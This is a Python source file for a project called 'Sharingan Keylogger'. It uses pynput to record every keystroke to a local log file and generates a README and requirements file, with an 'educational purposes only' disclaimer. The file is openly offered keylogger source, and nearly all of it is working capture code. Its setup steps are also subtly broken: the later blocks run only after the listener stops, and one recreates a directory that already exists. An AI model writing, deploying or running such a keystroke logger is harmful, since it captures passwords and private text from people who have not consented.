# main.py
# Sharingan Keylogger - Keyboard Input Monitoring Tool
# Warning: This tool is for educational purposes only. Stay within ethical and legal boundaries.

from pynput.keyboard import Listener
import os

# Directory and file name for logs
LOG_DIR = "logs"
LOG_FILE = "keylog.txt"

# Create log directory if it doesn't exist
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_path = os.path.join(LOG_DIR, LOG_FILE)

# Function to write to the log file
def write_to_file(key):
    with open(log_path, "a") as file:
        file.write(key + "\n")

# Callback function when a key is pressed
def on_press(key):
    try:
        # Normal characters
        write_to_file(str(key.char))
    except AttributeError:
        # Special keys (Shift, Enter, Backspace, etc.)
        write_to_file(str(key))

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()

# Creating additional files
# requirements.txt
txt_path = "requirements.txt"
requirements_content = "pynput\n"
with open(txt_path, "w") as req_file:
    req_file.write(requirements_content)

# README.md
readme_path = "README.md"
readme_content = """# Sharingan Keylogger

This project is a tool for monitoring keyboard inputs. It is intended to be used within ethical boundaries and for educational purposes only.

## Installation
1. Install the required dependencies:
   ```
   pip install -r requirements.txt
   ```
2. Run the `main.py` file:
   ```
   python main.py
   ```

## Warning
This tool is for educational and personal use only. Any misuse is the sole responsibility of the user.

## Ownership
This project was developed solely by **THEkuroix**, and all rights are reserved.

"""
with open(readme_path, "w") as readme_file:
    readme_file.write(readme_content)

# logs/keylog.txt
log_dir = "logs"
log_file_path = os.path.join(log_dir, "keylog.txt")
if not os.path.exists(log_file_path):
    os.makedirs(log_dir)
    with open(log_file_path, "w") as log_file:
        log_file.write("")
